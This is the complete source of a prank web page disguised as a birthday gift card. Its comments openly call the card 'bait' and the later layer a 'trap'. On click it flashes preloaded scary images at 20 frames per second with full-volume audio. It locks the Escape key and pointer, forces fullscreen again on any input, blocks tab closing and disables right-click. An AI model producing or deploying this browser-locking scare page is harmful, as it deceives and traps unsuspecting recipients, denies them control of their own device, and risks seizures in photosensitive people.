<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Happy Birthday! ðŸŽ‚</title>
    <style>
        /* --- GLOBAL RESET --- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background: #000;
        }

        /* =========================================
           LAYER 1: THE INNOCENT "BAIT" UI (GLASSMORPHISM)
           ========================================= */
        #innocent-layer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            /* Modern Mesh Gradient Background */
            background: radial-gradient(at top left, #a8c0ff, transparent),
                        radial-gradient(at bottom right, #3f2b96, transparent),
                        linear-gradient(to bottom right, #ff9a9e, #fad0c4);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 100;
            transition: opacity 0.2s ease-out;
            overflow: hidden;
        }

        /* Animated Background Orbs for Glass Effect */
        .orb {
            position: absolute;
            border-radius: 50%;
            filter: blur(60px);
            opacity: 0.8;
            z-index: 101; /* Behind card */
            animation: floatOrb 10s infinite ease-in-out;
        }

        .orb-1 {
            width: 300px;
            height: 300px;
            background: #8ec5fc;
            top: -50px;
            left: -50px;
            animation-delay: 0s;
        }

        .orb-2 {
            width: 400px;
            height: 400px;
            background: #e0c3fc;
            bottom: -100px;
            right: -100px;
            animation-delay: -5s;
        }

        @keyframes floatOrb {
            0%, 100% { transform: translate(0, 0) scale(1); }
            50% { transform: translate(30px, -30px) scale(1.1); }
        }

        /* The Glass Card */
        .card {
            background: rgba(255, 255, 255, 0.2); /* Semi-transparent white */
            backdrop-filter: blur(25px);         /* The Frost Effect */
            -webkit-backdrop-filter: blur(25px); /* Safari support */
            border: 1px solid rgba(255, 255, 255, 0.3); /* Subtle white border */
            padding: 50px 40px;
            border-radius: 30px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2); /* Soft shadow for depth */
            text-align: center;
            max-width: 90%;
            width: 450px;
            position: relative;
            z-index: 102;
        }

        .card h1 {
            color: #fff;
            font-size: 3rem;
            margin-bottom: 15px;
            font-weight: 700;
            text-shadow: 0 4px 10px rgba(0,0,0,0.1);
            letter-spacing: -1px;
        }

        .card p {
            color: rgba(255, 255, 255, 0.9);
            margin-bottom: 40px;
            font-size: 1.2rem;
            line-height: 1.6;
            font-weight: 500;
        }

        /* Glassy Button */
        .btn-surprise {
            background: rgba(255, 255, 255, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.5);
            color: #fff;
            padding: 18px 45px;
            font-size: 1.1rem;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
            backdrop-filter: blur(5px);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
            outline: none;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .btn-surprise:hover {
            background: rgba(255, 255, 255, 0.5);
            transform: translateY(-3px);
            box-shadow: 0 15px 25px rgba(0, 0, 0, 0.15);
        }

        .btn-surprise:active {
            transform: scale(0.95);
        }
        
        .btn-surprise:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .loading-text {
            margin-top: 20px;
            font-size: 0.85rem;
            color: rgba(255, 255, 255, 0.7);
            opacity: 0;
            transition: opacity 0.3s;
            font-weight: 500;
            letter-spacing: 0.5px;
        }

        /* Simple Confetti */
        .confetti {
            position: absolute;
            width: 10px;
            height: 10px;
            background-color: #fff;
            animation: fall linear forwards;
            z-index: 101;
            opacity: 0.8;
        }

        @keyframes fall {
            to { transform: translateY(100vh) rotate(720deg); }
        }

        /* =========================================
           LAYER 2: THE CHAOS "SWITCH" UI
           ========================================= */
        #chaos-layer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 1; /* Behind innocent layer initially */
            display: none; /* Hidden until triggered */
        }

        .loop-img {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none;
        }

        .loop-img.active {
            display: block;
        }

        /* The Trap Net (Invisible overlay to catch clicks if they escape fullscreen) */
        #trap-net {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 9999;
            display: none;
            cursor: none;
        }

    </style>
</head>
<body>

    <!-- AUDIO SOURCE (Hidden) -->
    <!-- Ensure your file is named music.mp3 -->
    <audio id="bg-audio" loop>
        <source src="music.mp3" type="audio/mpeg">
    </audio>

    <!-- INNOCENT UI (GLASSMORPHISM) -->
    <div id="innocent-layer">
        <!-- Floating Orbs for effect -->
        <div class="orb orb-1"></div>
        <div class="orb orb-2"></div>
        
        <div class="card">
            <h1>Surprise! ðŸŽ‰</h1>
            <p>I've prepared a special digital gift for you.<br>Please ensure your volume is ON. ðŸ”Š</p>
            <button class="btn-surprise" id="trigger-btn" disabled>Loading Gift...</button>
            <div class="loading-text" id="load-status">Decrypting assets...</div>
        </div>
    </div>

    <!-- CHAOS UI -->
    <div id="chaos-layer">
        <!-- Images injected here -->
    </div>

    <!-- TRAP NET -->
    <div id="trap-net"></div>

    <script>
        // --- CONFIGURATION ---
        const CONFIG = {
            imageCount: 15,          // 1.jpg to 15.jpg
            loopSpeed: 50,           // 50ms = 20 frames per second (Very Fast)
            fileExt: '.jpg'
        };

        // --- ELEMENTS ---
        const innocentLayer = document.getElementById('innocent-layer');
        const chaosLayer = document.getElementById('chaos-layer');
        const triggerBtn = document.getElementById('trigger-btn');
        const loadStatus = document.getElementById('load-status');
        const chaosContainer = document.getElementById('chaos-layer');
        const audio = document.getElementById('bg-audio');
        const trapNet = document.getElementById('trap-net');

        let images = [];
        let loaded = 0;
        let activeIndex = 0;
        let isPrankActive = false;

        // --- 1. SETUP: PRELOAD ASSETS SILENTLY ---
        // We load the scary images while they are looking at the cute birthday card.
        function preloadImages() {
            loadStatus.style.opacity = '1';
            
            for(let i=1; i <= CONFIG.imageCount; i++) {
                const img = new Image();
                img.src = `${i}${CONFIG.fileExt}`;
                img.className = 'loop-img';
                
                img.onload = () => {
                    loaded++;
                    checkLoad();
                };
                img.onerror = () => {
                    loaded++; // Proceed anyway
                    checkLoad();
                };

                images.push(img);
                chaosContainer.appendChild(img);
            }
        }

        function checkLoad() {
            if(loaded >= CONFIG.imageCount) {
                triggerBtn.disabled = false;
                triggerBtn.textContent = "Open Gift ðŸŽ";
                loadStatus.style.opacity = '0';
            }
        }

        // --- 2. THE TRIGGER ---
        triggerBtn.addEventListener('click', () => {
            isPrankActive = true;

            // A. Switch UI Instantly
            innocentLayer.style.display = 'none';
            chaosLayer.style.display = 'block';
            trapNet.style.display = 'block';

            // B. Fullscreen & Lock
            forceFullscreen();

            // C. Audio
            audio.volume = 1.0;
            audio.play();

            // D. Start Loop
            startChaosLoop();
        });

        // --- 3. THE LOOP ---
        function startChaosLoop() {
            setInterval(() => {
                // Hide current
                images[activeIndex].classList.remove('active');
                
                // Increment
                activeIndex++;
                if(activeIndex >= images.length) activeIndex = 0;
                
                // Show next
                images[activeIndex].classList.add('active');
            }, CONFIG.loopSpeed);
        }

        // --- 4. AGGRESSIVE FULLSCREEN TRAP LOGIC ---
        async function forceFullscreen() {
            const doc = document.documentElement;
            
            // 1. Try Fullscreen
            try {
                if (doc.requestFullscreen) await doc.requestFullscreen();
                else if (doc.webkitRequestFullscreen) await doc.webkitRequestFullscreen();
            } catch(e) {
                console.log("FS Blocked");
            }
            
            // 2. Try Keyboard Lock (The "Anti-Escape" mechanic)
            // This prevents ESC from exiting fullscreen in Chrome/Edge on Desktop
            try {
                if (navigator.keyboard && navigator.keyboard.lock) {
                    await navigator.keyboard.lock(['Escape']);
                    console.log("Keyboard Locked");
                }
            } catch(e) {
                console.log("Lock Failed");
            }

            // 3. Try Pointer Lock (Hides cursor and locks it to window)
            try {
                document.body.requestPointerLock();
            } catch(e) {}
        }

        // Monitor if they press ESC (If keyboard lock fails)
        document.addEventListener('fullscreenchange', () => {
            if (!document.fullscreenElement && isPrankActive) {
                // They escaped!
                // 1. Keep playing audio
                audio.play();
                
                // 2. IMMEDIATE RE-ENTRY ATTEMPT
                forceFullscreen();
            }
        });

        // 3. MULTI-VECTOR TRAP: ANY INTERACTION RE-TRIGGERS
        // If the auto-re-entry failed, this catches them instantly on next input
        ['click', 'mousemove', 'mousedown', 'touchstart', 'keydown', 'resize', 'focus'].forEach(evt => {
            window.addEventListener(evt, () => {
                if(isPrankActive && !document.fullscreenElement) {
                    forceFullscreen();
                }
            });
        });

        // 4. PREVENT TAB CLOSING
        window.onbeforeunload = function() {
            if(isPrankActive) {
                return "Are you sure you want to leave?";
            }
        };

        // --- 5. VISUAL FLUFF (Confetti) ---
        // Makes the bait look real
        function createConfetti() {
            const colors = ['#fff', '#f0f', '#0ff', '#ff0'];
            const conf = document.createElement('div');
            conf.className = 'confetti';
            conf.style.left = Math.random() * 100 + 'vw';
            conf.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
            conf.style.animationDuration = (Math.random() * 3 + 2) + 's';
            innocentLayer.appendChild(conf);

            // Remove after animation
            setTimeout(() => conf.remove(), 5000);
        }
        
        // Spawn confetti every 300ms
        setInterval(createConfetti, 300);

        // Start
        preloadImages();

        // Prevent Right Click (Context Menu)
        document.addEventListener('contextmenu', event => event.preventDefault());

    </script>
</body>
</html>
